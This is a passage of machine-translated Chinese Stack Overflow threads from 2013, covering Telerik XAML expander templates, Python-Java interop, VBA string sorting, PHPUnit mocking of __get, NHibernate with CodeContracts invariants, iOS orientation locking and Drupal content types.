                                                                                              <telerik:LayoutTransformControl x:Name="HeaderContentTransform" Grid.Column="0" Grid.Row="0" RenderTransformOrigin=".5 .5">
                                                                                                              <ContentPresenter x:Name="HeaderContent" ContentTemplate="{TemplateBinding HeaderTemplate}" Content="{TemplateBinding Header}" Grid.Column="1" HorizontalAlignment="Stretch" Margin="5 0" VerticalAlignment="Stretch"/>
                                                                                              </telerik:LayoutTransformControl>
                                                                              </Grid>
                                                               </telerik:RadToggleButton>
                                                               <ContentPresenter x:Name="Content" ContentTemplate="{TemplateBinding ContentTemplate}" Content="{TemplateBinding Content}" HorizontalAlignment="{TemplateBinding HorizontalContentAlignment}" Margin="{TemplateBinding Padding}" Visibility="Collapsed" VerticalAlignment="{TemplateBinding VerticalContentAlignment}"/>
                                               </Grid>
                               </Border>
                </Grid>
    </ControlTemplate> 
```

你知道它可能来自哪里吗？提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-28T08:25:18.453

更多信息：

```
<SolidColorBrush x:Key="Expander_Background" Color="#00FFFFFF"/>
    <SolidColorBrush x:Key="Expander_BorderBrush" Color="#00FFFFFF"/>
    <Thickness x:Key="Expander_BorderThickness">0</Thickness>
    <SolidColorBrush x:Key="ControlInnerBorder_Normal" Color="#FFFFFFFF"/>
    <SolidColorBrush x:Key="ControlElement_Normal" Color="#FF000000"/>
    <SolidColorBrush x:Key="ControlOuterBorder_Focused" Color="#FFFFC92B"/>
    <ControlTemplate x:Key="FAQRadToggleButtonControlTemplate" TargetType="telerik:RadToggleButton">
                <Grid>
                               <VisualStateManager.VisualStateGroups>
                                               <VisualStateGroup x:Name="FocusStates">
                                                               <VisualStateGroup.Transitions>
                                                                              <VisualTransition GeneratedDuration="0:0:0.2" To="Focused"/>
                                                                              <VisualTransition GeneratedDuration="0:0:0.2" To="Unfocused"/>
                                                               </VisualStateGroup.Transitions>
                                                               <VisualState x:Name="Unfocused"/>
                                                               <VisualState x:Name="Focused"/>
                                               </VisualStateGroup>
                               </VisualStateManager.VisualStateGroups>
                               <ContentPresenter ContentTemplate="{TemplateBinding ContentTemplate}" Content="{TemplateBinding Content}" HorizontalAlignment="{TemplateBinding HorizontalContentAlignment}" Margin="{TemplateBinding Padding}" VerticalAlignment="{TemplateBinding VerticalContentAlignment}"/>
                </Grid>
    </ControlTemplate>

    <ControlTemplate x:Key="ToggleTemplate" TargetType="telerik:RadToggleButton">
                <Grid>
                               <VisualStateManager.VisualStateGroups>
                                               <VisualStateGroup x:Name="FocusStates">
                                                               <VisualStateGroup.Transitions>
                                                                              <VisualTransition GeneratedDuration="0:0:0.2" To="Focused"/>
                                                                              <VisualTransition GeneratedDuration="0:0:0.2" To="Unfocused"/>
                                                               </VisualStateGroup.Transitions>
                                                               <VisualState x:Name="Unfocused"/>
                                                               <VisualState x:Name="Focused">
                                                                              <Storyboard>
                                                                                              <ObjectAnimationUsingKeyFrames Duration="0:0:0" Storyboard.TargetProperty="Visibility" Storyboard.TargetName="FocusDecorator">
                                                                                                              <DiscreteObjectKeyFrame KeyTime="0:0:0">
                                                                                                                             <DiscreteObjectKeyFrame.Value>
                                                                                                                                             <Visibility>Visible</Visibility>
                                                                                                                             </DiscreteObjectKeyFrame.Value>
                                                                                                              </DiscreteObjectKeyFrame>
                                                                                              </ObjectAnimationUsingKeyFrames>
                                                                              </Storyboard>
                                                               </VisualState>
                                               </VisualStateGroup>
                               </VisualStateManager.VisualStateGroups>
                               <ContentPresenter x:Name="Content" ContentTemplate="{TemplateBinding ContentTemplate}" Content="{TemplateBinding Content}" HorizontalAlignment="{TemplateBinding HorizontalContentAlignment}" Margin="{TemplateBinding Padding}" VerticalAlignment="{TemplateBinding VerticalContentAlignment}"/>
                               <Rectangle x:Name="FocusDecorator" IsHitTestVisible="false" Stroke="{StaticResource ControlOuterBorder_Focused}" StrokeThickness="1" StrokeDashArray="1 2" Visibility="Collapsed"/>
                </Grid>
    </ControlTemplate>

    <CornerRadius x:Key="Expander_BorderRadius">3</CornerRadius>
    <SolidColorBrush x:Key="ControlOuterBorder_Disabled" Color="#FF989898"/>
    <SolidColorBrush x:Key="ControlInnerBorder_Disabled" Color="Transparent"/>
    <SolidColorBrush x:Key="ControlBackground_Disabled" Color="#FFE0E0E0"/>
    <SolidColorBrush x:Key="ControlElement_Disabled" Color="#FF8D8D8D"/>
    <SolidColorBrush x:Key="ControlOuterBorder_MouseOver" Color="#FFFFC92B"/>
    <SolidColorBrush x:Key="ControlInnerBorder_MouseOver" Color="#FFFFFFFF"/>

    <LinearGradientBrush x:Key="ControlBackground_MouseOver" EndPoint="0.5,1" StartPoint="0.5,0">
                <GradientStop Color="#FFFFFBDA" Offset="0"/>
                <GradientStop Color="#FFFEEBAE" Offset="0.50"/>
                <GradientStop Color="#FFFFD25A" Offset="0.50"/>
                <GradientStop Color="#FFFFFBA3" Offset="1"/>
    </LinearGradientBrush>

    <SolidColorBrush x:Key="ControlElement_MouseOver" Color="#FF000000"/>
    <LinearGradientBrush x:Key="ControlOuterBorder_Pressed" EndPoint="0.5,1" StartPoint="0.5,0">
                <GradientStop Color="#FF282828"/>
                <GradientStop Color="#FF5F5F5F" Offset="1"/>
    </LinearGradientBrush>
    <LinearGradientBrush x:Key="ControlInnerBorder_Pressed" EndPoint="0.5,1" StartPoint="0.5,0">
                <GradientStop Color="#FFB69A78"/>
                <GradientStop Color="#FFFFE17A" Offset="0.126"/>
    </LinearGradientBrush>
    <LinearGradientBrush x:Key="ControlBackground_Pressed" EndPoint="0.5,1" StartPoint="0.5,0">
                <GradientStop Color="#FFFFDCAB" Offset="0"/>
                <GradientStop Color="#FFFFD18F" Offset="0.5"/>
                <GradientStop Color="#FFFE9227" Offset="0.5"/>
                <GradientStop Color="#FFFFBA74" Offset="0"/>
    </LinearGradientBrush>
    <SolidColorBrush x:Key="ControlElement_Pressed" Color="#FF000000"/>

    <Style x:Key="FAQRadExpanderStyle" TargetType="telerik:RadExpander">
                <Setter Property="IsTabStop" Value="false"/>
                <Setter Property="HorizontalContentAlignment" Value="Stretch"/>
                <Setter Property="VerticalContentAlignment" Value="Stretch"/>
                <Setter Property="Background" Value="{StaticResource Expander_Background}"/>
                <Setter Property="BorderBrush" Value="{StaticResource Expander_BorderBrush}"/>
                <Setter Property="BorderThickness" Value="{StaticResource Expander_BorderThickness}"/>
                <Setter Property="Padding" Value="2"/>
                <Setter Property="Template" Value="{StaticResource ExpanderTemplate}"/>
                <Setter Property="telerik:AnimationManager.AnimationSelector">
                               <Setter.Value>
                                               <telerik:AnimationSelector>
                                                              <telerik:ExpanderExpandCollapseAnimation AnimationName="Expand" Direction="In" TargetElementName="Content"/>
                                                               <telerik:ExpanderExpandCollapseAnimation AnimationName="Collapse" Direction="Out" TargetElementName="Content"/>
                                               </telerik:AnimationSelector>
                               </Setter.Value>
                </Setter>
    </Style>

      <DataTemplate x:Key="FAQListBoxItems">
        <toolkit:WrapPanel>
                                <telerik:RadExpander IsExpanded="False" VerticalContentAlignment="Top"
                                                                                                                             telerik:AnimationManager.IsAnimationEnabled="{Binding ElementName=AnimationEnableCheckBox, Path=IsChecked}" Style="{StaticResource FAQRadExpanderStyle}">
            <telerik:RadExpander.Header>
               <ContentPresenter Margin="5" Content="{Binding Title}"/>
            </telerik:RadExpander.Header>
            <telerik:RadExpander.Content>
                <ContentPresenter Margin="5" Content="{Binding Answer}"/>
            </telerik:RadExpander.Content>
        </telerik:RadExpander>
        </toolkit:WrapPanel>
    </DataTemplate>

      <Style x:Key="FAQListBoxItemStyle" TargetType="ListBoxItem">
                <Setter Property="Padding" Value="3"/>
                <Setter Property="HorizontalContentAlignment" Value="Left"/>
                <Setter Property="VerticalContentAlignment" Value="Top"/>
                <Setter Property="Background" Value="Transparent"/>
                <Setter Property="BorderThickness" Value="1"/>
                <Setter Property="TabNavigation" Value="Local"/>
                <Setter Property="Template">
                               <Setter.Value>
                                               <ControlTemplate TargetType="ListBoxItem">
                                                               <Grid Background="{TemplateBinding Background}">
                                                                              <VisualStateManager.VisualStateGroups>
                                                                                              <VisualStateGroup x:Name="CommonStates">
                                                                                                              <VisualState x:Name="Normal"/>
                                                                                                              <VisualState x:Name="MouseOver">
                                                                                                                             <Storyboard>
                                                                                                                                             <DoubleAnimation Duration="0" To=".35" Storyboard.TargetProperty="Opacity" Storyboard.TargetName="fillColor"/>
                                                                                                                             </Storyboard>
                                                                                                              </VisualState>
                                                                                                              <VisualState x:Name="Disabled">
                                                                                                                             <Storyboard>
                                                                                                                                             <DoubleAnimation Duration="0" To=".55" Storyboard.TargetProperty="Opacity" Storyboard.TargetName="contentPresenter"/>
                                                                                                                             </Storyboard>
                                                                                                              </VisualState>
                                                                                              </VisualStateGroup>
                                                                                              <VisualStateGroup x:Name="SelectionStates">
                                                                                                              <VisualState x:Name="Unselected"/>
                                                                                                              <VisualState x:Name="Selected">
                                                                                                                             <Storyboard>
                                                                                                                                             <DoubleAnimation Duration="0" To=".75" Storyboard.TargetProperty="Opacity" Storyboard.TargetName="fillColor2"/>
                                                                                                                                             <ColorAnimation Duration="0" To="{StaticResource TransparentDarkDarkColor}" Storyboard.TargetProperty="(Shape.Fill).(SolidColorBrush.Color)" Storyboard.TargetName="fillColor2" d:IsOptimized="True"/>
                                                                                                                             </Storyboard>
                                                                                                              </VisualState>
                                                                                                              <VisualState x:Name="SelectedUnfocused"/>
                                                                                              </VisualStateGroup>
                                                                                              <VisualStateGroup x:Name="FocusStates">
                                                                                                              <VisualState x:Name="Focused"/>
                                                                                                             <VisualState x:Name="Unfocused"/>
                                                                                              </VisualStateGroup>
                                                                                              <VisualStateGroup x:Name="LayoutStates">
                                                                                                              <VisualState x:Name="AfterLoaded"/>
                                                                                                              <VisualState x:Name="BeforeLoaded"/>
                                                                                                              <VisualState x:Name="BeforeUnloaded"/>
                                                                                              </VisualStateGroup>
                                                                              </VisualStateManager.VisualStateGroups>
                                                                              <Rectangle x:Name="fillColor" Fill="#FFBADDE9" IsHitTestVisible="False" Opacity="0" RadiusY="1" RadiusX="1"/>
                                                                              <Rectangle x:Name="fillColor2" Fill="#FFBADDE9" IsHitTestVisible="False" Opacity="0" RadiusY="1" RadiusX="1"/>
                                                                              <ContentPresenter x:Name="contentPresenter" ContentTemplate="{TemplateBinding ContentTemplate}" Content="{TemplateBinding Content}" HorizontalAlignment="{TemplateBinding HorizontalContentAlignment}" Margin="{TemplateBinding Padding}"/>
                                                               </Grid>
                                               </ControlTemplate>
                               </Setter.Value>
                </Setter>
      </Style> 
```

# java - 如何从 Python 与 Java 交互

> ID：15110830
> 
> 赞同：4
> 
> 时间：2013-02-27T11:21:48.843
> 
> 标签：java, python, api, matlab, jython

我目前使用 Matlab 作为一种科学计算语言，但有兴趣转向更开放的替代方案。Python (+scipy +numpy +matplotlib) 似乎是最好的方法。我对这种切换的最大担忧是 Python 不会像 Matlab 那样与 Java 交互好/容易/无缝，而且我经常需要使用 Java API。我特别喜欢 Matlab 中的那个：

1) 我可以实例化 Java 对象并访问它们的成员变量和方法

2) Java 事件在 Matlab 中变成“回调”

3) Java 类型自动转换为 Matlab 类型（布尔到逻辑等）

据我所知，Python 中有 3 个选项（如下）。我担心的是，每一个都是由一个非常小的开发人员社区支持/开发的（据我了解，每种情况下都有 1-3 人）并且这种支持可能不会永远存在。以下哪项是 Matlab 所做的两件事？在可预见的未来，哪个最有可能继续这样做？如果我也可以使用 Python 中的 Java GUI，那将是一个额外的好处。我错过了任何选择吗？

1）Jython

2）Py4J

3) 类型

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T14:07:34.020

我不认为有一个简单的方法可以做到这一点，因为 SciPy 和朋友目前不在 Jython 上运行。您可以将事物作为客户端服务器或作为具有重定向标准输入/输出/错误的子进程运行。

我还在我的一个 Python 项目中玩弄了 XML-RPC，我[从可用的文档](http://nditoolbox.chriscoughlin.com/plugins_samples.html#dev_sample_java)中得到了一个可能有用的信息。走这条路你不会得到世界上最好的性能，但它确实具有相当容易上手的优点。

# sorting - 通过vba excel按数字升序对包含字符串的范围进行排序

> ID：15110831
> 
> 赞同：1
> 
> 时间：2013-02-27T11:21:58.177
> 
> 标签：sorting, excel, range, vba

我有一个包含以下字符串的范围：

step_1, step_10, step_3, step_2

使用以下代码

```
input_sh.Activate
With ActiveSheet
    .Range("H2:H20").Select
    .Sort.SortFields.Clear
    .Sort.SortFields.Add Key:=Range("H2"), _
       SortOn:=xlSortOnValues, Order:=xlAscending, DataOption:=xlSortTextAsNumbers 'xlSortNormal
With .Sort
        .SetRange Range("H2:H20")
        .Header = xlNo
        .MatchCase = False
        .Orientation = xlTopToBottom
        .SortMethod = xlPinYin
        .Apply
End With 
```

step_10, step_1, step_2, step_3

但我想得到

step_1, step_2,step_3,step_10

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-02-27T12:22:18.587

我会使用 mid 函数将数字分成另一列，即您的最后一个 + 1 并对其进行排序。

* * *

编辑：我不在我的电脑上，但我认为你这样做的唯一方法是设置一个宏：

1.  按前 9 个过滤您的工作表。
2.  在第 2 行之前剪切并插入它们。
3.  自行排序。
4.  然后删除过滤器并按照上面的方式对其余部分进行排序。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-02-28T09:20:56.697

您的字符串有下划线后跟数字。如果这将是您的字符串的格式，您可以使用“_”作为分隔符将文本转换为列来简单地拆分字符串。稍后您可以排序和连接以获得排序的字符串列表。

![在此处输入图像描述](../Images/704adfbee68b5d3f99b4205978fa5e12.png)

```
 Sub Sample()

        Columns(1).Copy Columns(3)

        Columns("C:C").Select
        Selection.TextToColumns Destination:=Range("C1"), DataType:=xlDelimited, _
                                TextQualifier:=xlDoubleQuote, Other:=True, OtherChar:="_", FieldInfo:=Array(Array(1, 1), Array(2, 1))

        Columns("D:D").Sort Range("D1")

        i = 1
        Do While Not IsEmpty(Range("C" & i))
            Range("B" & i) = Range("C" & i) & "_" & Range("D" & i)
            i = i + 1
        Loop

    End Sub 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-28T10:18:42.683

感谢每一个人的贡献。对于用户，我在阅读您的建议之前找到了我的解决方案。无论如何感谢你的努力

我的解决方案：

*   将 str 拆分为“_”
*   在文件名旁边写第二个索引 order 2nd cols by then col 只有数字
*   用数字清洁 col

# php - PHPUnit：模拟 __get() 导致“__get() 必须恰好采用 1 个参数 ...”

> ID：15110833
> 
> 赞同：15
> 
> 时间：2013-02-27T11:21:58.597
> 
> 标签：php, phpunit, overloading, built-in

我在模拟重载的 __get($index) 方法时遇到了问题。要模拟的类和使用它的被测系统的代码如下：

```
<?php
class ToBeMocked
{
    protected $vars = array();

    public function __get($index)
    {
        if (isset($this->vars[$index])) {
            return $this->vars[$index];
        } else {
            return NULL;
        }
    }
}

class SUTclass
{
    protected $mocky;

    public function __construct(ToBeMocked $mocky)
    {
        $this->mocky = $mocky;
    }

    public function getSnack()
    {
        return $this->mocky->snack;
    }
} 
```

测试如下：

```
<?php    
class GetSnackTest extends PHPUnit_Framework_TestCase
{
    protected $stub;
    protected $sut;

    public function setUp()
    {
       $mock = $this->getMockBuilder('ToBeMocked')
                     ->setMethods(array('__get')
                     ->getMock();

       $sut = new SUTclass($mock);
    }

    /**
     * @test
     */
    public function shouldReturnSnickers()
    {
        $this->mock->expects($this->once())
                   ->method('__get')
                   ->will($this->returnValue('snickers');

        $this->assertEquals('snickers', $this->sut->getSnack());
    }
} 
```

真正的代码稍微复杂一些，虽然不多，但在其父类中有“getSnacks()”。但是这个例子应该足够了。

问题是我在使用 PHPUnit 执行测试时收到以下错误：

```
Fatal error: Method Mock_ToBeMocked_12345672f::__get() must take exactly 1 argument in /usr/share/php/PHPUnit/Framework/MockObject/Generator.php(231) 
```

当我调试时，我什至无法达到测试方法。似乎它在设置模拟对象时中断了。

有任何想法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-09-13T16:15:43.283

`__get()`接受一个参数，所以你需要为模拟提供一个：

```
/**
 * @test
 */
public function shouldReturnSnickers()
{
    $this->mock->expects($this->once())
               ->method('__get')
               ->with($this->equalTo('snack'))
               ->will($this->returnValue('snickers'));

    $this->assertEquals('snickers', $this->sut->getSnack());
} 
```

该`with()`方法为 PHPUnit 中的模拟方法设置参数。您可以在[Test Doubles](https://phpunit.de/manual/current/en/test-doubles.html)部分找到更多详细信息。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2021-02-07T12:40:13.813

它在评论中有点隐藏，但@dfmuir 的回答让我走上了正轨。`__get`如果您使用回调，则模拟方法很简单。

```
$mock
    ->method('__get')
    ->willReturnCallback(function ($propertyName) {
        switch($propertyName) {
            case 'id':
                return 123123123123;
            case 'name':
                return 'Bob';
            case 'email':
                return 'bob@bob.com';
        }
    }
);

$this->assertEquals('bob@bob.com', $mock->email); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-10-01T10:01:55.013

查看模拟的魔术方法__get。可能您从另一个未正确模拟的对象中再调用一个 __get 方法。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2020-03-02T13:15:27.427

您在班级`setUp`方法中所做的事情`GetSnackTest`是不正确的。如果您希望`__get`执行该方法的代码（这将是您的测试的重点> 我想），您必须更改您在该方法中调用`setMethods`的`setup`方式。 [这是完整的解释](https://jtreminio.com/blog/unit-testing-tutorial-part-v-mock-methods-and-overriding-constructors/#the-four-pathways-of-getmockbuilder)，但这里是相关部分：

> 传递包含方法名称的数组
> 
> 您确定的方法：
> 
> 都是存根，默认都返回null，很容易被覆盖

因此，您需要`setMethods`通过传递来调用`null`，或者通过传递包含*一些*方法（您*真正*想要存根的方法）的数组来调用，但*不是* `__get`（因为您实际上希望执行该方法的代码）。

在该`shouldReturnSnickers`方法中，您将只想调用`$this->assertEquals('snickers', $this->sut->getSnack());`，而没有前面的行与`expect`部分。这将确保您的`__get`方法的代码实际执行和测试。

* * *

## 回答 #5

> 赞同：-2
> 
> 时间：2014-10-09T11:42:32.197

withAnyParameters() 方法可以帮助你，这是正确的：

```
$this->mock -> expects($this -> once())  
    -> method('__get') -> withAnyParameters()
    -> will($this -> returnValue('snikers')); 
```

# c# - ORM 结合 CodeContracts 使用的实体 - 确保不变量

> ID：15110837
> 
> 赞同：4
> 
> 时间：2013-02-27T11:22:01.973
> 
> 标签：c#, .net, nhibernate, code-contracts

我目前正在将 CodeContracts 添加到我现有的代码库中。
证明困难的一件事是使用由 NHibernate 水合的实体。

假设这个简单的类：

```
public class Post
{
    private Blog _blog;

    [Obsolete("Required by NHibernate")]
    protected Post() { }

    public Post(Blog blog)
    {
        Contract.Requires(blog != null);
        _blog = blog;
    }

    public Blog Blog
    {
        get
        {
            Contract.Ensures(Contract.Result<Blog>() != null);
            return _blog;
        }
        set
        {
            Contract.Requires(value != null);
            _blog = value;
        }
    }

    [ContractInvariantMethod]
    private void Invariants()
    {
        Contract.Invariant(_blog != null);
    }
} 
```

这个类试图保护不变量`_blog != null`。`Post`但是，它目前失败了，因为我可以很容易地通过从它派生并使用受保护的构造函数来创建一个实例。在那种情况下`_blog`将是`null`.
我正在尝试以不变量确实受到保护的方式更改我的代码库。

NHibernate 乍一看需要受保护的构造函数来创建新实例，但是有[一种方法可以绕过这个要求](http://kozmic.net/2011/03/20/working-with-nhibernate-without-default-constructors/)。
该方法基本上使用[`FormatterServices.GetUninitializedObject`](http://msdn.microsoft.com/en-us/library/system.runtime.serialization.formatterservices.getuninitializedobject.aspx). 重要的一点是，此方法不运行任何构造函数。
我可以使用这种方法，它可以让我摆脱受保护的构造函数。CodeContracts 的静态检查器现在会很高兴并且不再报告任何违规行为，但是一旦 NHibernate 尝试对此类实体进行水合，它将生成“不变失败”异常，因为它会尝试一个接一个地设置一个属性，并且每个属性设置器都会执行验证不变量的代码。

因此，为了完成所有这些工作，我必须确保实体通过其公共构造函数进行实例化。

但是我该怎么做呢？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-02-27T12:17:12.943

丹尼尔，如果我没记错的话（自从我与 NH 合作已经有一段时间了）你可以有一个私有构造函数，他仍然应该可以很好地创建你的对象。

除此之外，为什么您需要 100% 确定？这是某种方式的要求，还是你只是想覆盖所有的基础？

我之所以这么问，是因为根据要求，我们可以采用另一种方式来实现它。

为了提供额外的保护，你现在可以做的是连接一个 IInterceptor 类，以确保在加载之后你的类仍然有效。

我想底线是，如果有人想弄乱您的域和课程，无论您做什么，他们都会这样做。在大多数情况下，阻止所有这些事情的努力并没有得到回报。

**澄清后编辑**

如果您使用您的对象写入数据库并且您的合同正在工作，您可以放心地假设数据将被正确写入，因此如果没有人篡改数据库，则数据将正确加载。

如果您确实手动更改了数据库，您应该停止这样做并使用您的域来执行此操作（这就是验证逻辑所在的位置）或测试数据库更改过程。

尽管如此，如果你真的需要它，你仍然可以连接一个 IInterceptor 来在加载后验证你的实体，但我不认为你可以通过确保你的房子管道正常来解决来自街道的洪水。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-02-28T09:39:37.227

基于与 tucaz 的讨论，我在其核心相当简单的解决方案中提出了以下内容：

这个解决方案的核心是类`NHibernateActivator`。它有两个重要目的：

1.  创建对象的实例而不调用其构造函数。它[`FormatterServices.GetUninitializedObject`](http://msdn.microsoft.com/en-us/library/system.runtime.serialization.formatterservices.getuninitializedobject.aspx)用于此。
2.  在 NHibernate 水合实例时防止触发“不变失败”异常。这是一个两步任务：在 NHibernate 开始补水之前禁用不变检查，并在 NHibernate 完成后重新启用不变检查。
    第一部分可以在创建实例后直接执行。
    第二部分是使用接口`IPostLoadEventListener`。

类本身非常简单：

```
public class NHibernateActivator : INHibernateActivator, IPostLoadEventListener
{
    public bool CanInstantiate(Type type)
    {
        return !type.IsAbstract && !type.IsInterface &&
               !type.IsGenericTypeDefinition && !type.IsSealed;
    }

    public object Instantiate(Type type)
    {
        var instance = FormatterServices.GetUninitializedObject(type);
        instance.DisableInvariantEvaluation();
        return instance;
    }

    public void OnPostLoad(PostLoadEvent @event)
    {
        if (@event != null && @event.Entity != null)
            @event.Entity.EnableInvariantEvaluation(true);
    }
} 
```

`DisableInvariantEvaluation`并且`EnableInvariantEvaluation`目前是使用反射来设置受保护字段的扩展方法。该字段防止检查不变量。此外`EnableInvariantEvaluation`，如果它通过，将执行检查不变量的方法`true`：

```
public static class CodeContractsExtensions
{
    public static void DisableInvariantEvaluation(this object entity)
    {
        var evaluatingInvariantField = entity.GetType()
                                             .GetField(
                                                 "$evaluatingInvariant$", 
                                                 BindingFlags.NonPublic | 
                                                 BindingFlags.Instance);
        if (evaluatingInvariantField == null)
            return;
        evaluatingInvariantField.SetValue(entity, true);
    }

    public static void EnableInvariantEvaluation(this object entity,
                                                 bool evaluateNow)
    {
        var evaluatingInvariantField = entity.GetType()
                                             .GetField(
                                                 "$evaluatingInvariant$", 
                                                 BindingFlags.NonPublic | 
                                                 BindingFlags.Instance);
        if (evaluatingInvariantField == null)
            return;
        evaluatingInvariantField.SetValue(entity, false);

        if (!evaluateNow)
            return;
        var invariantMethod = entity.GetType()
                                    .GetMethod("$InvariantMethod$",
                                               BindingFlags.NonPublic | 
                                               BindingFlags.Instance);
        if (invariantMethod == null)
            return;
        invariantMethod.Invoke(entity, new object[0]);
    }
} 
```

其余的是 NHibernate 管道：

1.  我们需要实现一个使用我们的激活器的拦截器。
2.  我们需要实现一个反射优化器来返回我们对`IInstantiationOptimizer`. 这个实现又再次使用我们的激活器。
3.  我们需要实现一个使用我们的激活器的代理工厂。
4.  我们需要实现`IProxyFactoryFactory`返回我们的自定义代理工厂。
5.  我们需要创建一个自定义代理验证器，它不关心该类型是否具有默认构造函数。
6.  我们需要实现一个返回我们的反射优化器和代理工厂工厂的字节码提供程序。
7.  NHibernateActivator 需要注册为使用Fluent NHibernate`config.AppendListeners(ListenerType.PostLoad, ...);`的监听器。`ExposeConfiguration`
8.  我们的自定义字节码提供程序需要使用`Environment.BytecodeProvider`.
9.  我们的自定义拦截器需要使用`config.Interceptor = ...;`.

当我有机会从所有这些中创建一个连贯的包并将其放在 github 上时，我将更新此答案。
此外，我想摆脱反射并创建一个代理类型，而不是直接访问受保护的 CodeContract 成员。

作为参考，以下博客文章有助于实现几个 NHibernate 接口：

*   [http://weblogs.asp.net/ricardoperes/archive/2012/06/19/implementing-an-interceptor-using-nhibernate-s-built-in-dynamic-proxy-generator.aspx](http://weblogs.asp.net/ricardoperes/archive/2012/06/19/implementing-an-interceptor-using-nhibernate-s-built-in-dynamic-proxy-generator.aspx)
*   [http://kozmic.net/2011/03/20/working-with-nhibernate-without-default-constructors/](http://kozmic.net/2011/03/20/working-with-nhibernate-without-default-constructors/)

* * *

不幸的是，目前这对于具有复合键的实体来说是失败的，因为反射优化器没有用于它们。这实际上是 NHibernate 中的一个错误，我在[这里](https://nhibernate.jira.com/browse/NH-3410)报告了它。

# iphone - xcode - 如何将视图锁定为纵向模式，但仍允许一个视图旋转？

> ID：15110838
> 
> 赞同：3
> 
> 时间：2013-02-27T11:22:03.960
> 
> 标签：iphone, xcode, orientation, portrait, screen-rotation

我遇到了设备旋转问题。除了显示公司启动画面的 ONE 视图之外，我想将所有剩余的应用程序视图锁定为纵向显示。在项目设置中，支持的方向是纵向和横向。在“Company Splash”中，它工作正常，并且无论我如何旋转设备，视图旋转都被锁定到 LandscapeLeft。在所有其他视图中，当我将设备向左旋转时，视图会发生变化，而不是保持纵向显示。连开枪的方法都没有？如果我从项目中支持的方向中删除横向左侧，则会破坏“公司飞溅”视图。我尝试将`shouldAutorotate`return 更改为`NO`，但这没有帮助。试图通过[这里发布的建议来工作](https://stackoverflow.com/questions/12728390/portrait-and-landscape-mode-in-ios6)，但这没有帮助。如果我将以下代码放入我的 AppDelegate.m 中，所有内容都被锁定为纵向模式，并且“公司启动画面”在访问时崩溃。

```
-(NSUInteger)application:(UIApplication *)application supportedInterfaceOrientationsForWindow:(UIWindow *)window
{
    return UIInterfaceOrientationMaskPortrait | UIInterfaceOrientationMaskPortraitUpsideDown;
} 
```

除了一个屏幕外，无论设备如何旋转，如何将视图锁定为纵向模式？

** 来自“Company Splash”视图的方法。再次，按预期工作。

```
-(NSInteger)supportedInterfaceOrientations
{
    return UIInterfaceOrientationMaskLandscapeLeft;
} 
```

** 来自所有其他视图的方法，当我不希望它们旋转时，它们会旋转

```
-(BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation
{
    // IOS5 Only returning that it should rotate to potrait
    return (interfaceOrientation == UIDeviceOrientationPortrait);
}

-(BOOL)shouldAutorotate
{
    // forcing the rotate IOS6 Only
    return YES;
}

-(NSInteger)supportedInterfaceOrientations
{
    // return number or enum IOS6 Only
    return UIInterfaceOrientationMaskPortrait;
} 
```

我想这可能是因为 UITabBarController 是根控制器，而我在 ViewController 中？连开枪的方法都没有？

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2013-02-27T13:08:50.357

将观察者添加到要旋转的视图的 viewDidLoad 方法中，如下所示：

```
[[UIDevice currentDevice] beginGeneratingDeviceOrientationNotifications];
[[NSNotificationCenter defaultCenter]
 addObserver:self selector:@selector(orientationChanged:)
 name:UIDeviceOrientationDidChangeNotification
 object:[UIDevice currentDevice]]; 
```

然后根据**orientationChanged**方法中的横向视图设置视图，如下所示：

```
- (void) orientationChanged:(NSNotification *)note{
UIDevice * device = [UIDevice currentDevice];
switch(device.orientation)
{
    case UIDeviceOrientationPortrait:

        break;
    case UIDeviceOrientationPortraitUpsideDown:

        break;
    case UIDeviceOrientationLandscapeLeft:

        break;
    case UIDeviceOrientationLandscapeRight:

        break;

    default:
        break;
  };
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2014-09-04T20:48:26.180

将此方法放入您希望锁定在某个方向的视图控制器中。

```
-(NSUInteger)supportedInterfaceOrientations
{
    return UIInterfaceOrientationMaskLandscape;
} 
```

只需更改为您想要的方向（以上将其锁定为横向）

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-02-27T11:32:37.683

也许你应该允许所有方向，并在每个班级中锁定纵向方向，除了公司飞溅

```
- (BOOL)shouldAutorotateToInterfaceOrientation:(UIInterfaceOrientation)interfaceOrientation
{
    if (interfaceOrientation == UIInterfaceOrientationPortrait) {
    return (interfaceOrientation == UIInterfaceOrientationLandscapeRight);
    } else {
    return (interfaceOrientation == UIInterfaceOrientationLandscapeRight);
    }
} 
```

# drupal - Drupal 7 - 全局更新内容类型的方法或正确程序 - 需要建议/建议

> ID：15110840
> 
> 赞同：0
> 
> 时间：2013-02-27T11:22:08.503
> 
> 标签：drupal

（我也在 Drupal 支持论坛上添加了这个，希望没问题 :) 只是希望能得到很多反馈）

我在完成我的第一个主要 Drupal 7 构建后不久，这真的很有趣，但我承认有一个相当大的学习曲线，经过一年多的开发，我承认我仍然不知道它的全部功能和容量德鲁巴。

我的构建从构建我们自己的子主题开始，并使用它来覆盖所有核心主题样式并根据我们的需要进行定制。

接下来，我将解释我们构建的结构。我的任务是大约 20 种不同的页面样式，因此我又为每种不同的样式开发了 20 种内容类型（模板），然后我从这里为每种内容类型添加了一些关键字段，然后将我的代码输入到这些字段中在每个内容类型中。例如，带有横幅区域、下方滑块区域和下方内容区域的页面，对于这个示例来说，它们都是我们网站主体宽度的 960 像素。所以这个内容类型将由三个字段组成，每个字段都添加了 div 和内容。

节点开发过程将是，如果用户想要上面的页面样式，他们将选择该内容类型，并简单地编辑演示内容与新节点所需的内容并设置为实时。所以这就是网站开发页面的过程，它没有碰壁，对我来说很遗憾。

